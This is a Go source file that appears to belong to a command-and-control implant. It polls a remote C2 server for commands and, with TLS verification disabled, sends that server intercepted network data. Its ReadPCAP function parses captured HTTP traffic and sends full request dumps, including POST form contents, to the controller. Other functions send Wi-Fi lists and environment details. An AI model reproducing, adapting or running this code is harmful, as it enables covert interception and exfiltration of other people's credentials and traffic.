package command

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"strconv"
	"time"

	"github.com/distatus/battery"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type listen struct {
	Error   string `json:"error"`
	Success string `json:"success"`
	Data    []struct {
		CommandText string `json:"command_text"`
	} `json:"data"`
}

type postData struct {
	InsertType string            `json:"insertType"`
	Data       map[string]string `json:"data"`
}

func sendGet(action string) ([]byte, bool) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	req, err := http.NewRequest("GET", CcHOST+CcGATE+action, nil)

	if err != nil {
		fmt.Printf("server not responding %s", err.Error())
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {

		fmt.Printf("server not responding %s", err.Error())
	} else {

		defer resp.Body.Close()
		body, _ := ioutil.ReadAll(resp.Body)
		return body, false
	}
	return []byte(""), true
}

func SendEvent(title string, body string) {

	if body == "" {
		body = title
		title = "New event"
	}
	data := postData{"sendEvent", map[string]string{
		"event_title": title,
		"event_body":  body,
	}}
	sendPost(data)
}

func sendPost(post postData) {

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	postJson, err := json.Marshal(post)
	if err != nil {
		panic(err)
	}
	postContent := bytes.NewBuffer(postJson)
	http.Post(CcHOST+CcGATE+"send", "application/json", postContent)
	/*//Check response buffer body.
	buf, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(buf))*/

}

func GetStatus() (bool){
	fmt.Println("Check status")
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	req, err := http.NewRequest("GET", CcHOST+CcGATE+"checkStatus", nil)

	if err != nil {
		fmt.Printf("server not responding %s", err.Error())
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {

		fmt.Printf("server not responding %s", err.Error())
	} else {

		defer resp.Body.Close()
		body, _ := ioutil.ReadAll(resp.Body)
		if string(body) == "1"{
			return true
		}
	}
	return false
}

func SendBattery() {
	bat, err := battery.GetAll()
	if err == nil {
		if len(bat) > 1 {
			batteryLevel := bat[0].Current / bat[0].Full * 100
			data := postData{"sendBattery", map[string]string{
				"batteryLevel": strconv.FormatFloat(batteryLevel, 'f', 6, 64),
			}}
			sendPost(data)
		} else {
			data := postData{"sendBattery", map[string]string{
				"batteryLevel": "Unknown",
			}}
			sendPost(data)
		}
	}
}

func ReadPCAP(verbose bool) {

	handle, err := pcap.OpenOffline(CoreDirectory + "/../webserver/output/XVlBzg.pcap")
	if err == nil {
		handle.SetBPFFilter(PacketFilter)
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			trpLayer := packet.TransportLayer()
			networkLayer := packet.NetworkLayer()
			if trpLayer.LayerType() == layers.LayerTypeTCP {

				ip := networkLayer.(*layers.IPv4)
				tcp := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)
				data := tcp.Payload
				reader := bufio.NewReader(bytes.NewReader(data))
				req, err := http.ReadRequest(reader)

				if err == nil {
					requestDump, err := httputil.DumpRequest(req, true)
					if err != nil {
						fmt.Println(err)
					}
					requestPost := ""
					if req.Method == "POST" {
						req.ParseForm()
						requestPost = req.Form.Encode()
					}
					data := postData{"sendLogs", map[string]string{
						"log_layers":      "TCP",
						"log_type":        "HTTP",
						"log_dest":        ip.DstIP.String(),
						"log_src":         ip.SrcIP.String(),
						"log_host":        req.Host,
						"log_url":         req.RequestURI,
						"log_method":      req.Method,
						"log_form":        requestPost,
						"log_cookie":      "",
						"log_headers":     "",
						"log_requestdump": string(requestDump),
					}}
					if verbose == true {
						fmt.Println(P_SIMPLE(YELLOW, string(requestDump)))
					}
					SendEvent("HTTP packet intercept", string(requestDump))
					sendPost(data)

				}
			}
			time.Sleep(1000 * time.Millisecond)
		}
	}
}

func ListenCC() string {

	resp, err := sendGet("listen")
	if err == false {
		body := resp
		Command := listen{}

		json.Unmarshal([]byte(body), &Command)
		for _, value := range Command.Data {
			return string(value.CommandText)
		}
	} else {

		return ""
	}
	return ""
}

func ReadWifi(wifi string) {

	data := postData{"sendWifi", map[string]string{
		"wifiJson": wifi,
	}}
	sendPost(data)
	SendEvent("Wifi list has been send.", "")
}

func ReadEnvironment(s string) {

	data := postData{"sendEnvironment", map[string]string{
		"Environment": s,
	}}
	sendPost(data)
	SendEvent("Environment element has been send.", "")
}
